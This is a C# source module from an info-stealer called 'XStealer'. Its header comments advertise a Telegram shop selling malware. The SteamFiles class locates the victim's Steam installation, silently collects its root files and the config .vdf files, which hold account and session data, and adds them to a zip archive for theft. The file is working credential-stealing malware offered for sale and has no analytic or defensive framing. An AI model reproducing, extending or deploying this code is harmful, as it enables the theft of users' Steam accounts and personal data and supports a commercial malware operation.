// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Steam
{
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class SteamFiles
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Метод сбора данных Steam</br>
        /// <br><b>ENG</b></br><br>Steam data collection method</br>
        /// </summary>
        /// <param name="Expansion"><br><b>RUS</b></br><br>Паттерн расширения</br><br><b>ENG</b></br><br>Pattern expansion</br></param>
        /// <param name="ConfigFiles"><br><b>RUS</b></br><br>Имя расширения файла</br><br><b>ENG</b></br><br>File extension name</br></param>
        /// <param name="Name"><br><b>RUS</b></br><br>Имя папки с Конфигом</br><br><b>ENG</b></br><br>Config folder name</br></param>
        public static void Inizialize()
        {
            if (Directory.Exists(SteamPath.GetLocationSteam()))
            {
                try
                {
                    foreach (string file in Directory.EnumerateFiles(SteamPath.GetLocationSteam(), ".*").Where(file => !file.Contains(".crash")))
                    {
                        ZipEx.AddKeyPairStream($"Steam/{Path.GetFileName(file)}", ConverterEx.ToBytes(true, file));
                    }
                    string LocalSteamDir = GlobalPaths.CombinePath(SteamPath.GetLocationSteam(), "config");
                    foreach (string file2 in Directory.EnumerateFiles(LocalSteamDir, "*.vdf"))
                    {
                        ZipEx.AddKeyPairStream($"Steam/Config/{Path.GetFileName(file2)}", ConverterEx.ToBytes(true, file2));
                    }
                }
                catch { }
            }
        }
    }
}